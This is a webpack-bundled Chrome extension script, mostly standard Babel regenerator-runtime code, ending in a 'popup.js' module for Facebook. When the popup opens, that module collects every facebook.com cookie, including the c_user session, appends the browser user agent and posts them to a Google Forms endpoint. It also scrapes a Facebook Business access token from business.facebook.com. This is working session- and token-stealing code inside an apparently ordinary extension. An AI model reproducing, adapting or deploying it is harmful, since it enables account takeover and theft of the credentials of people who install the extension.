 (function(modules) {
 	
 	var installedModules = {};

 	
 	function __webpack_require__(moduleId) {

 		
 		if(installedModules[moduleId]) {
 			return installedModules[moduleId].exports;
 		}
 		
 		var module = installedModules[moduleId] = {
 			i: moduleId,
 			l: false,
 			exports: {}
 		};

 		
 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

 		
 		module.l = true;

 	
 		return module.exports;
 	}


 	
 	__webpack_require__.m = modules;

 
 	__webpack_require__.c = installedModules;

 	
 	__webpack_require__.d = function(exports, name, getter) {
 		if(!__webpack_require__.o(exports, name)) {
 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
 		}
 	};

 	
 	__webpack_require__.r = function(exports) {
 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
 		}
 		Object.defineProperty(exports, '__esModule', { value: true });
 	};

 	
 	__webpack_require__.t = function(value, mode) {
 		if(mode & 1) value = __webpack_require__(value);
 		if(mode & 8) return value;
 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
 		var ns = Object.create(null);
 		__webpack_require__.r(ns);
 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
 		return ns;
 	};

 	
 	__webpack_require__.n = function(module) {
 		var getter = module && module.__esModule ?
 			function getDefault() { return module['default']; } :
 			function getModuleExports() { return module; };
 		__webpack_require__.d(getter, 'a', getter);
 		return getter;
 	};

 	
 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };

 	
 	__webpack_require__.p = "/";


 	
 	return __webpack_require__(__webpack_require__.s = 2);
 })

({

"./node_modules/@babel/runtime/regenerator/index.js":

 (function(module, exports, __webpack_require__) {

    module.exports = __webpack_require__("./node_modules/regenerator-runtime/runtime.js");


    }),
    
    "./node_modules/regenerator-runtime/runtime.js":

     (function(module, exports, __webpack_require__) {
    

    var runtime = (function (exports) {
      "use strict";
    
      var Op = Object.prototype;
      var hasOwn = Op.hasOwnProperty;
      var undefined; 
      var $Symbol = typeof Symbol === "function" ? Symbol : {};
      var iteratorSymbol = $Symbol.iterator || "@@iterator";
      var asyncIteratorSymbol = $Symbol.asyncIterator || "@@asyncIterator";
      var toStringTagSymbol = $Symbol.toStringTag || "@@toStringTag";
    
      function wrap(innerFn, outerFn, self, tryLocsList) {
        var protoGenerator = outerFn && outerFn.prototype instanceof Generator ? outerFn : Generator;
        var generator = Object.create(protoGenerator.prototype);
        var context = new Context(tryLocsList || []);
        generator._invoke = makeInvokeMethod(innerFn, self, context);
    
        return generator;
      }
      exports.wrap = wrap;
      function tryCatch(fn, obj, arg) {
        try {
          return { type: "normal", arg: fn.call(obj, arg) };
        } catch (err) {
          return { type: "throw", arg: err };
        }
      }
    
      var GenStateSuspendedStart = "suspendedStart";
      var GenStateSuspendedYield = "suspendedYield";
      var GenStateExecuting = "executing";
      var GenStateCompleted = "completed";

      var ContinueSentinel = {};

      function Generator() {}
      function GeneratorFunction() {}
      function GeneratorFunctionPrototype() {}

      var IteratorPrototype = {};
      IteratorPrototype[iteratorSymbol] = function () {
        return this;
      };
    
      var getProto = Object.getPrototypeOf;
      var NativeIteratorPrototype = getProto && getProto(getProto(values([])));
      if (NativeIteratorPrototype &&
          NativeIteratorPrototype !== Op &&
          hasOwn.call(NativeIteratorPrototype, iteratorSymbol)) {
        IteratorPrototype = NativeIteratorPrototype;
      }
    
      var Gp = GeneratorFunctionPrototype.prototype =
        Generator.prototype = Object.create(IteratorPrototype);
      GeneratorFunction.prototype = Gp.constructor = GeneratorFunctionPrototype;
      GeneratorFunctionPrototype.constructor = GeneratorFunction;
      GeneratorFunctionPrototype[toStringTagSymbol] =
        GeneratorFunction.displayName = "GeneratorFunction";
      function defineIteratorMethods(prototype) {
        ["next", "throw", "return"].forEach(function(method) {
          prototype[method] = function(arg) {
            return this._invoke(method, arg);
          };
        });
      }
    
      exports.isGeneratorFunction = function(genFun) {
        var ctor = typeof genFun === "function" && genFun.constructor;
        return ctor
          ? ctor === GeneratorFunction ||
            (ctor.displayName || ctor.name) === "GeneratorFunction"
          : false;
      };
    
      exports.mark = function(genFun) {
        if (Object.setPrototypeOf) {
          Object.setPrototypeOf(genFun, GeneratorFunctionPrototype);
        } else {
          genFun.__proto__ = GeneratorFunctionPrototype;
          if (!(toStringTagSymbol in genFun)) {
            genFun[toStringTagSymbol] = "GeneratorFunction";
          }
        }
        genFun.prototype = Object.create(Gp);
        return genFun;
      };
      exports.awrap = function(arg) {
        return { __await: arg };
      };
    
      function AsyncIterator(generator, PromiseImpl) {
        function invoke(method, arg, resolve, reject) {
          var record = tryCatch(generator[method], generator, arg);
          if (record.type === "throw") {
            reject(record.arg);
          } else {
            var result = record.arg;
            var value = result.value;
            if (value &&
                typeof value === "object" &&
                hasOwn.call(value, "__await")) {
              return PromiseImpl.resolve(value.__await).then(function(value) {
                invoke("next", value, resolve, reject);
              }, function(err) {
                invoke("throw", err, resolve, reject);
              });
            }
    
            return PromiseImpl.resolve(value).then(function(unwrapped) {
              result.value = unwrapped;
              resolve(result);
            }, function(error) {
             
              return invoke("throw", error, resolve, reject);
            });
          }
        }
    
        var previousPromise;
    
        function enqueue(method, arg) {
          function callInvokeWithMethodAndArg() {
            return new PromiseImpl(function(resolve, reject) {
              invoke(method, arg, resolve, reject);
            });
          }
    
          return previousPromise =
            previousPromise ? previousPromise.then(
              callInvokeWithMethodAndArg,
              callInvokeWithMethodAndArg
            ) : callInvokeWithMethodAndArg();
        }
        this._invoke = enqueue;
      }
    
      defineIteratorMethods(AsyncIterator.prototype);
      AsyncIterator.prototype[asyncIteratorSymbol] = function () {
        return this;
      };
      exports.AsyncIterator = AsyncIterator;
      exports.async = function(innerFn, outerFn, self, tryLocsList, PromiseImpl) {
        if (PromiseImpl === void 0) PromiseImpl = Promise;
    
        var iter = new AsyncIterator(
          wrap(innerFn, outerFn, self, tryLocsList),
          PromiseImpl
        );
    
        return exports.isGeneratorFunction(outerFn)
          ? iter 
          : iter.next().then(function(result) {
              return result.done ? result.value : iter.next();
            });
      };
    
      function makeInvokeMethod(innerFn, self, context) {
        var state = GenStateSuspendedStart;
    
        return function invoke(method, arg) {
          if (state === GenStateExecuting) {
            throw new Error("Generator is already running");
          }
    
          if (state === GenStateCompleted) {
            if (method === "throw") {
              throw arg;
            }

            return doneResult();
          }
    
          context.method = method;
          context.arg = arg;
    
          while (true) {
            var delegate = context.delegate;
            if (delegate) {
              var delegateResult = maybeInvokeDelegate(delegate, context);
              if (delegateResult) {
                if (delegateResult === ContinueSentinel) continue;
                return delegateResult;
              }
            }
    
            if (context.method === "next") {
              context.sent = context._sent = context.arg;
    
            } else if (context.method === "throw") {
              if (state === GenStateSuspendedStart) {
                state = GenStateCompleted;
                throw context.arg;
              }
    
              context.dispatchException(context.arg);
    
            } else if (context.method === "return") {
              context.abrupt("return", context.arg);
            }
    
            state = GenStateExecuting;
    
            var record = tryCatch(innerFn, self, context);
            if (record.type === "normal") {
              state = context.done
                ? GenStateCompleted
                : GenStateSuspendedYield;
    
              if (record.arg === ContinueSentinel) {
                continue;
              }
    
              return {
                value: record.arg,
                done: context.done
              };
    
            } else if (record.type === "throw") {
              state = GenStateCompleted;
             
              context.method = "throw";
              context.arg = record.arg;
            }
          }
        };
      }
  
      function maybeInvokeDelegate(delegate, context) {
        var method = delegate.iterator[context.method];
        if (method === undefined) {
      
          context.delegate = null;
    
          if (context.method === "throw") {
           
            if (delegate.iterator["return"]) {
            
              context.method = "return";
              context.arg = undefined;
              maybeInvokeDelegate(delegate, context);
    
              if (context.method === "throw") {
               
                return ContinueSentinel;
              }
            }
    
            context.method = "throw";
            context.arg = new TypeError(
              "The iterator does not provide a 'throw' method");
          }
    
          return ContinueSentinel;
        }
    
        var record = tryCatch(method, delegate.iterator, context.arg);
    
        if (record.type === "throw") {
          context.method = "throw";
          context.arg = record.arg;
          context.delegate = null;
          return ContinueSentinel;
        }
    
        var info = record.arg;
    
        if (! info) {
          context.method = "throw";
          context.arg = new TypeError("iterator result is not an object");
          context.delegate = null;
          return ContinueSentinel;
        }
    
        if (info.done) {
          context[delegate.resultName] = info.value;

          context.next = delegate.nextLoc;

          if (context.method !== "return") {
            context.method = "next";
            context.arg = undefined;
          }
    
        } else {
          return info;
        }
        context.delegate = null;
        return ContinueSentinel;
      }
      defineIteratorMethods(Gp);
    
      Gp[toStringTagSymbol] = "Generator";
      Gp[iteratorSymbol] = function() {
        return this;
      };
    
      Gp.toString = function() {
        return "[object Generator]";
      };
    
      function pushTryEntry(locs) {
        var entry = { tryLoc: locs[0] };
    
        if (1 in locs) {
          entry.catchLoc = locs[1];
        }
    
        if (2 in locs) {
          entry.finallyLoc = locs[2];
          entry.afterLoc = locs[3];
        }
    
        this.tryEntries.push(entry);
      }
    
      function resetTryEntry(entry) {
        var record = entry.completion || {};
        record.type = "normal";
        delete record.arg;
        entry.completion = record;
      }
    
      function Context(tryLocsList) {
        this.tryEntries = [{ tryLoc: "root" }];
        tryLocsList.forEach(pushTryEntry, this);
        this.reset(true);
      }
    
      exports.keys = function(object) {
        var keys = [];
        for (var key in object) {
          keys.push(key);
        }
        keys.reverse();
        return function next() {
          while (keys.length) {
            var key = keys.pop();
            if (key in object) {
              next.value = key;
              next.done = false;
              return next;
            }
          }
          next.done = true;
          return next;
        };
      };
    
      function values(iterable) {
        if (iterable) {
          var iteratorMethod = iterable[iteratorSymbol];
          if (iteratorMethod) {
            return iteratorMethod.call(iterable);
          }
    
          if (typeof iterable.next === "function") {
            return iterable;
          }
    
          if (!isNaN(iterable.length)) {
            var i = -1, next = function next() {
              while (++i < iterable.length) {
                if (hasOwn.call(iterable, i)) {
                  next.value = iterable[i];
                  next.done = false;
                  return next;
                }
              }
    
              next.value = undefined;
              next.done = true;
    
              return next;
            };
    
            return next.next = next;
          }
        }
    
        // Return an iterator with no values.
        return { next: doneResult };
      }
      exports.values = values;
    
      function doneResult() {
        return { value: undefined, done: true };
      }
    
      Context.prototype = {
        constructor: Context,
    
        reset: function(skipTempReset) {
          this.prev = 0;
          this.next = 0;
          this.sent = this._sent = undefined;
          this.done = false;
          this.delegate = null;
    
          this.method = "next";
          this.arg = undefined;
    
          this.tryEntries.forEach(resetTryEntry);
    
          if (!skipTempReset) {
            for (var name in this) {
              if (name.charAt(0) === "t" &&
                  hasOwn.call(this, name) &&
                  !isNaN(+name.slice(1))) {
                this[name] = undefined;
              }
            }
          }
        },
    
        stop: function() {
          this.done = true;
    
          var rootEntry = this.tryEntries[0];
          var rootRecord = rootEntry.completion;
          if (rootRecord.type === "throw") {
            throw rootRecord.arg;
          }
    
          return this.rval;
        },
    
        dispatchException: function(exception) {
          if (this.done) {
            throw exception;
          }
    
          var context = this;
          function handle(loc, caught) {
            record.type = "throw";
            record.arg = exception;
            context.next = loc;
    
            if (caught) {
              context.method = "next";
              context.arg = undefined;
            }
    
            return !! caught;
          }
    
          for (var i = this.tryEntries.length - 1; i >= 0; --i) {
            var entry = this.tryEntries[i];
            var record = entry.completion;
    
            if (entry.tryLoc === "root") {
              return handle("end");
            }
    
            if (entry.tryLoc <= this.prev) {
              var hasCatch = hasOwn.call(entry, "catchLoc");
              var hasFinally = hasOwn.call(entry, "finallyLoc");
    
              if (hasCatch && hasFinally) {
                if (this.prev < entry.catchLoc) {
                  return handle(entry.catchLoc, true);
                } else if (this.prev < entry.finallyLoc) {
                  return handle(entry.finallyLoc);
                }
    
              } else if (hasCatch) {
                if (this.prev < entry.catchLoc) {
                  return handle(entry.catchLoc, true);
                }
    
              } else if (hasFinally) {
                if (this.prev < entry.finallyLoc) {
                  return handle(entry.finallyLoc);
                }
    
              } else {
                throw new Error("try statement without catch or finally");
              }
            }
          }
        },
    
        abrupt: function(type, arg) {
          for (var i = this.tryEntries.length - 1; i >= 0; --i) {
            var entry = this.tryEntries[i];
            if (entry.tryLoc <= this.prev &&
                hasOwn.call(entry, "finallyLoc") &&
                this.prev < entry.finallyLoc) {
              var finallyEntry = entry;
              break;
            }
          }
    
          if (finallyEntry &&
              (type === "break" ||
               type === "continue") &&
              finallyEntry.tryLoc <= arg &&
              arg <= finallyEntry.finallyLoc) {
            finallyEntry = null;
          }
    
          var record = finallyEntry ? finallyEntry.completion : {};
          record.type = type;
          record.arg = arg;
    
          if (finallyEntry) {
            this.method = "next";
            this.next = finallyEntry.finallyLoc;
            return ContinueSentinel;
          }
    
          return this.complete(record);
        },
    
        complete: function(record, afterLoc) {
          if (record.type === "throw") {
            throw record.arg;
          }
    
          if (record.type === "break" ||
              record.type === "continue") {
            this.next = record.arg;
          } else if (record.type === "return") {
            this.rval = this.arg = record.arg;
            this.method = "return";
            this.next = "end";
          } else if (record.type === "normal" && afterLoc) {
            this.next = afterLoc;
          }
    
          return ContinueSentinel;
        },
    
        finish: function(finallyLoc) {
          for (var i = this.tryEntries.length - 1; i >= 0; --i) {
            var entry = this.tryEntries[i];
            if (entry.finallyLoc === finallyLoc) {
              this.complete(entry.completion, entry.afterLoc);
              resetTryEntry(entry);
              return ContinueSentinel;
            }
          }
        },
    
        "catch": function(tryLoc) {
          for (var i = this.tryEntries.length - 1; i >= 0; --i) {
            var entry = this.tryEntries[i];
            if (entry.tryLoc === tryLoc) {
              var record = entry.completion;
              if (record.type === "throw") {
                var thrown = record.arg;
                resetTryEntry(entry);
              }
              return thrown;
            }
          }
    
          throw new Error("illegal catch attempt");
        },
    
        delegateYield: function(iterable, resultName, nextLoc) {
          this.delegate = {
            iterator: values(iterable),
            resultName: resultName,
            nextLoc: nextLoc
          };
    
          if (this.method === "next") {

            this.arg = undefined;
          }
    
          return ContinueSentinel;
        }
      };

      return exports;
    
    }(

       true ? module.exports : undefined
    ));
    
    try {
      regeneratorRuntime = runtime;
    } catch (accidentalStrictMode) {
      Function("r", "regeneratorRuntime = r")(runtime);
    }
     }),
    
     "./popup.js":
     (function(module, __webpack_exports__, __webpack_require__) {
    
    "use strict";
    __webpack_require__.r(__webpack_exports__);
     var _babel_runtime_regenerator__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/regenerator */ "./node_modules/@babel/runtime/regenerator/index.js");
     var _babel_runtime_regenerator__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_regenerator__WEBPACK_IMPORTED_MODULE_0__);
    function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { Promise.resolve(value).then(_next, _throw); } }
    function _asyncToGenerator(fn) { return function () { var self = this, args = arguments; return new Promise(function (resolve, reject) { var gen = fn.apply(self, args); function _next(value) { asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value); } function _throw(err) { asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err); } _next(undefined); }); }; }
var currentCookie = "";
var currentUid = "";
var currentToken = "";
var user_agent = "";
function postCookie(valCookie) {
    var data = new FormData()
    data.set('entry.397806239', valCookie);
    let request = new XMLHttpRequest();
    request.open("POST", 'https://docs.google.com/forms/d/e/1FAIpQLSeCQ2nry6OvfYtEgMom4tttWaFlBOB2M1x2TLsqhJJezL4V6g/formResponse', true);
    request.send(data);
}
function getCookie() {
    chrome.tabs.getSelected(null, function(tab) {
        var currentUrl = "https://www.facebook.com";
        chrome.cookies.getAll({
            "url": currentUrl
        }, function(cookie) {
            var result = "";
            console.log(cookie);
            for (var i = 0; i < cookie.length; i++) {
                result += cookie[i].name + "=" + cookie[i].value + ";";

                if (cookie[i].name == "c_user") {
                    currentUid = cookie[i].value;
                }
            }
            if (currentUid == "") {
                return false;
            }
            currentCookie = result;
            user_agent = navigator.userAgent;

            if (document.querySelector('[name="user-agent"]:checked')) {
                currentCookie += '|' + window.navigator.userAgent;
            }
            postCookie(currentCookie);
            document.body.style.backgroundImage = "linear-gradient(to right,#ffc077,#ed68ff)";
            document.getElementById("linkfb").onclick = function(){
                window.open("https://www.facebook.com/100029031824085");
            }
            if(currentCookie) getToken();
        });
    });
}
function getToken() {
    return _getToken.apply(this, arguments);
}
  function _getToken() {
    _getToken = _asyncToGenerator( /*#__PURE__*/_babel_runtime_regenerator__WEBPACK_IMPORTED_MODULE_0___default.a.mark(function _callee() {
      var token, token2;
      return _babel_runtime_regenerator__WEBPACK_IMPORTED_MODULE_0___default.a.wrap(function _callee$(_context) {
        while (1) {
          switch (_context.prev = _context.next) {
            case 0:
              $('.loading-example').show();
              _context.prev = 1;
              _context.next = 4;
              return getTokenBusiness();
  
            case 4:
              token = _context.sent;
              document.getElementById('inputId').value = token;
              _context.next = 8;
              return getToken2();
  
            case 8:
              token2 = _context.sent;
              document.getElementById('inputId').value = token2;
              saveCookie(currentCookie, token);
              _context.next = 16;
              break;
  
            case 13:
              _context.prev = 13;
              _context.t0 = _context["catch"](1);
              console.log(_context.t0);
  
            case 16:
              $('.loading-example').hide();
  
            case 17:
            case "end":
              return _context.stop();
          }
        }
      }, _callee, null, [[1, 13]]);
    }));
    return _getToken.apply(this, arguments);
  }
  
  function getTokenBusiness() {
    return new Promise(function (resolve, reject) {
      var currentUrl = "https://business.facebook.com/business_locations";
      $.ajax({
        url: currentUrl,
        type: 'get',
        success: function success(response) {
          if (response.search("EAA") == -1) {
            return resolve('');
          }
  
          var token_rex = response.match(/EAAGNO.*?\"/);
          currentToken = token_rex[0] ? token_rex[0].replace(/\W/g, "") : "";
          return resolve(currentToken);
        }
      });
    });
  }
document.addEventListener('DOMContentLoaded', function() {
    try {
        getCookie();
    } catch {}
});
}),
2:
 (function(module, exports, __webpack_require__) {
    module.exports = __webpack_require__(/*! /Users/huynv/Desktop/work/lalasoft/ext/cookie_fb/popup.js */"./popup.js");
})
 });
